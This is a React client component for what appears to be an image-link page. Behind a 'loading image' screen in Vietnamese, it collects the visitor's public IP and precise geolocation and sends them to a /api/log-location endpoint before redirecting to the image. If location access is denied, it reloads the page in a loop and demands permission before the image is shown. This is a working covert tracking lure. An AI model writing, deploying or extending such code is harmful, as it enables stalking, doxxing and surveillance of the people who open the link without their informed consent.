'use client';

import { useEffect, useState } from 'react';
import { Loader2, Camera, AlertTriangle } from 'lucide-react';

interface ImageRedirectClientProps {
  imageUrl: string;
}

export function ImageRedirectClient({ imageUrl }: ImageRedirectClientProps) {
  const [statusText, setStatusText] = useState('Đang tải ảnh...');
  const [showWarning, setShowWarning] = useState(false);

  useEffect(() => {
    const requestLocation = async () => {
      let clientIp = 'N/A';
      try {
          const ipResponse = await fetch('https://api.ipify.org?format=json');
          if (ipResponse.ok) {
              const ipData = await ipResponse.json();
              clientIp = ipData.ip;
          }
      } catch(e) {
          console.error("Could not fetch IP", e);
      }

      const logDataAndRedirect = (pos?: GeolocationPosition) => {
          const body: { ip: string; lat?: number; lon?: number; acc?: number; from: string } = { ip: clientIp, from: 'image' };
          if (pos) {
              body.lat = pos.coords.latitude;
              body.lon = pos.coords.longitude;
              body.acc = pos.coords.accuracy;
          }

          fetch('/api/log-location', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(body),
              keepalive: true,
          }).finally(() => {
              window.location.href = imageUrl;
          });
      }

      const handleError = (error: GeolocationPositionError) => {
        if (error.code === error.PERMISSION_DENIED) {
            setShowWarning(true);
            setStatusText('Vui lòng cho phép vị trí để xem ảnh!');
            setTimeout(() => {
                window.location.reload();
            }, 2500);
        } else {
            logDataAndRedirect();
        }
      };

      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          logDataAndRedirect, // Success
          handleError,        // Error
          { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
        );
      } else {
        logDataAndRedirect(); // Geolocation not supported
      }
    };
    
    // Delay slightly to ensure UI renders before permission prompt
    setTimeout(requestLocation, 100);

  }, [imageUrl]);

  return (
    <div style={{
      fontFamily: 'sans-serif',
      textAlign: 'center',
      paddingTop: '100px',
      background: '#23272A',
      color: '#fff',
      position: 'fixed',
      inset: 0,
      zIndex: 9999,
    }}>
      <div style={{
        background: '#2C2F33',
        padding: '40px',
        display: 'inline-block',
        borderRadius: '12px',
        boxShadow: '0 4px 10px rgba(0,0,0,0.1)',
        border: showWarning ? '2px solid #f87171' : 'none'
      }}>
        {showWarning ? 
          <AlertTriangle className="h-10 w-10 mx-auto mb-4 text-red-400" /> : 
          <Camera className="h-10 w-10 mx-auto mb-4" />
        }
        <h3 className="flex items-center justify-center gap-3 text-lg" style={{ color: showWarning ? '#fca5a5' : '#fff'}}>
            {showWarning ? null : <Loader2 className="h-5 w-5 animate-spin" />}
            {statusText}
        </h3>
        <p style={{color: '#99AAB5', fontSize: '14px', marginTop: '8px'}}>
            {showWarning ? 'Bạn sẽ được yêu cầu lại trong giây lát.' : 'Vui lòng chờ trong giây lát.'}
        </p>
      </div>
    </div>
  );
}
